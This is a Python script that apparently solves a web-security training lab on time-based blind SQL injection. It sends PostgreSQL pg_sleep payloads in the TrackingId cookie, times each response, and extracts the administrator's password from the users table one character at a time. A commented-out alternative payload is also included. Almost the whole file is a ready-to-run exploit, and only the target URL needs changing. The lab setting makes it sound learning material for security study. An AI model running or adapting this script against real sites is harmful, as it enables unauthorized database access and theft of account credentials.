#!/usr/bin/python3

"""
	Variable(s) that are required to change:
		- url
		
	Variables that you may need to be modified: 
		- pass_length, payload, sleep
		
	Lab Title: Blind SQL injection with time delays and information retrieval
"""

import requests
import sys 
import time


def main(args):

	pass_length = 20 
	chars = '0123456789abcdefghijklmnopqrstuvwxyz'
	url = "https://ac4d1f581ef8a22180550c7900580040.web-security-academy.net/filter?category=Lifestyle" # You MUST change this!
	passwd = ""
	sleep = 1.2
	
	for i in range(1, pass_length + 1): 
		for c in chars: 
			start_time = time.time()
			
			# Original payload I use using || concatination before I check the solution 
			# payload = f"x'||+(SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{i},1)='{c}')+THEN+pg_sleep(1.1)+ELSE+NULL+END+FROM+users)--" 
		
			# %3B is url encode for ;
			payload = f"x'%3B+SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{i},1)='{c}')+THEN+pg_sleep({sleep})+ELSE+pg_sleep(0)+END+FROM+users--" 
			
			print("Trying payload:", payload)
			r = requests.get(url, headers={'Cookie': f"TrackingId={payload}"} )
			
			exec_time = (time.time() - start_time)
			print(f"--- {exec_time} seconds ---")
			
			if exec_time >= sleep:
				print(f'[+] Password char found: {c}')
				passwd += c
				break
	print(f'The password for administrator is: {passwd}')
	
	
if __name__ == '__main__':
	main(sys.argv[1:])
	

